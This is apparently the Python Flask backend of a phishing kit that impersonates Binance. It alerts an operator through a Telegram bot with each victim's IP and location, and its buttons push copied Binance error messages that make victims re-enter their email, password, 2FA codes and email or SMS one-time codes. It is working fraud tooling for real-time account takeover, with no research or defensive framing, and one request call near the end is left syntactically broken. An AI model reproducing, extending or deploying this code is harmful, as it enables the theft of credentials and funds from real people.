from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from dotenv import load_dotenv
import os

load_dotenv()

app = Flask(__name__)
CORS(app, origins=["http://18.144.169.247:3000"])

TELEGRAM_API = f"https://api.telegram.org/bot{os.getenv('TELEGRAM_BOT_TOKEN')}/sendMessage"
COMMANDS = {
        "REQUEST_EMAIL_AGAIN": "Binance account not found",
        "REQUEST_PASSWORD_AGAIN": "Incorrect password. Please retry again. You have 3 more chances left.(200001004-a2437132)",
        "REQUEST_MOBILE_APP_VERIFICATION": "Mobile app verification page is not available yet",
        "REQUEST_AUTHENTICATION_EMAIL": "Auth and email page loaded",
        "REQUEST_AUTHENTICATION_PHONE": "Auth and phone page loaded",
        "REQUEST_AUTH_OTP_AGAIN": "You have entered an incorrect 2FA verification code.(200001013-210a9570)",
        "REQUEST_EMAIL_OTP_AGAIN": "Incorrect verification code. Please check your emails or resend the code and try again.(001412-c91b96d1)",
        "REQUEST_PHONE_OTP_AGAIN": "Incorrect verification code. Please check your SMS or resend the code and try again.(001412-c91b96d1)",
        "FINISH": "Redirecting user to the specified URL",
        }

@app.route('/notify', methods=['POST', 'OPTIONS'])
def notify():
    if request.method == 'OPTIONS':
        return jsonify({"status": "success"}), 200

    data = request.json
    ip = request.remote_addr

    message = f"New User Visited!\nIP: {ip}\nLocation: {get_location(ip)}"
    payload = {
            "chat_id": os.getenv('TELEGRAM_CHAT_ID'),
            "text": message,
            "reply_markup": {
                "inline_keyboard": [
                    [{"text": "REQUEST EMAIL AGAIN", "callback_data": "REQUEST_EMAIL_AGAIN"}],
                    [{"text": "REQUEST PASSWORD AGAIN", "callback_data": "REQUEST_PASSWORD_AGAIN"}],
                    [{"text": "REQUEST MOBILE APP VERIFICATION", "callback_data": "REQUEST_MOBILE_APP_VERIFICATION"}],
                    [{"text": "REQUEST AUTHENTICATION/EMAIL", "callback_data": "REQUEST_AUTHENTICATION_EMAIL"}],
                    [{"text": "REQUEST AUTHENTICATION/PHONE", "callback_data": "REQUEST_AUTHENTICATION_PHONE"}],
                    [{"text": "REQUEST AUTH OTP AGAIN", "callback_data": "REQUEST_AUTH_OTP_AGAIN"}],
                    [{"text": "REQUEST EMAIL OTP AGAIN", "callback_data": "REQUEST_EMAIL_OTP_AGAIN"}],
                    [{"text": "REQUEST PHONE OTP AGAIN", "callback_data": "REQUEST_PHONE_OTP_AGAIN"}],
                    [{"text": "FINISH", "callback_data": "FINISH"}],
                    ]
                }
            }
    requests.post(TELEGRAM_API, json=payload)

    return jsonify({"status": "success"})

@app.route('/command', methods=['POST'])
def handle_command():
    data = request.json
    command = data.get("command")

    if command in COMMANDS:
        # For now, just print the command to the console
        print(f"Received command: {command} - {COMMANDS[command]}")
        return jsonify({"status": "success", "message": COMMANDS[command]})
    else:
        return jsonify({"status": "error", "message": "Invalid command"}), 400

def get_location(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city")
        location = response.json()
        return f"{location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}"
    except:
        return "Location unavailable"


@app.route('/telegram-callback', methods=['POST'])
def telegram_callback():
    data = request.json
    callback_data = data.get("callback_query", {}).get("data")

    if callback_data in COMMANDS:
        # Forward the command to the /command endpoint
        response = requests.post(
                'http://localhost:5000/command',
                json={"command": callback_data}
                )
        return jsonify({"status": "success"})
    else:
        return jsonify({"status": "error", "message": "Invalid callback data"}), 400

@app.route('/telegram-webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    if 'callback_query' in update:
        callback_data = update['callback_query']['data']
        print(f"COMMAND RECEIVED: {callback_data}")
        # Forward to command handler
        requests.post(
                'http://localhost:5000/command',
                json={"command": callback_data}
        return jsonify({"status": "success"})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
